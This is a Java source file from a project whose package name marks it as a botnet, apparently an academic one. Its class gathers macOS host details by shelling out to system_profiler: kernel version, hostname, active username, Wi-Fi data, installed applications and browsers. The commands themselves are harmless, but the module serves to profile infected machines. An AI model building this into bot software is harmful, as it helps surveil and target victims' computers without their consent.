package com.acmutv.botnet.core.analysis;

import java.util.Random;

import com.acmutv.botnet.tool.runtime.RunCmdTools;
import lombok.Data;
import lombok.NoArgsConstructor;

/**
 * This class provides methods for the detection of sys info from Mac OS X operating system 
 * @author Giacomo Marciani {@literal <gmarciani@ieee.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0.0
 * @see Random
 */

@Data
@NoArgsConstructor
public class AppleSysInfoTools {

	/* Apple command: system_profiler -listDataTypes */
	
	/**
	 * Returns the kernel version of the system
	 * @return kernel Version
	 */
	public String getKernelVersion(){
		return RunCmdTools.runCmd("system_profiler SPSoftwareDataType | grep -e  Kernel' 'Version | awk -F':' '{print $2}'");
	}
	
	/**
	 * Returns the name of the host
	 * @return hostname
	 */
	public String getHostName(){
		return RunCmdTools.runCmd("system_profiler SPSoftwareDataType | grep -e  Computer' 'Name | awk -F':' '{print $2}'");
	}
	
	/**
	 * Returns the username of the active user on the system
	 * @return username
	 */
	public String getUserName(){
		return RunCmdTools.runCmd("system_profiler SPSoftwareDataType | grep -e  User' 'Name | awk -F':' '{print $2}'");
	}
	
	/**
	 * Returns info of the network it is connected to the system
	 * @return network info
	 */
	public String getNetworkData(){
		return RunCmdTools.runCmd("system_profiler SPAirPortDataType");
	}
	
	/**
	 * Returns the list of applications installed on the system
	 * @return applications list
	 */
	public String getApplications(){
		return RunCmdTools.runCmd("system_profiler SPApplicationsDataType");
	}
	
	/**
	 * Returns the local connections of the system
	 * @return local connections list
	 */
	public String getNetworkLocations(){
		return RunCmdTools.runCmd("system_profiler SPNetworkLocationDataType");
	}
	
	/**
	 * Returns the list of browsers installed on the system
	 * @return browsers list
	 */
	public String getBrowsers(){
		String app = RunCmdTools.runCmd("system_profiler SPApplicationsDataType");
		String browsers = "";
		
		if(app.contains("Chrome.app"))
			browsers +="\nGoogle Chrome";
		if(app.contains("Safari.app"))
			browsers +="\nSafari";
		if(app.contains("Mozilla.app"))
			browsers +="\nMozilla";
		if(app.contains("Opera.app"))
			browsers +="\nOpera";
		
		return browsers;
	}	
}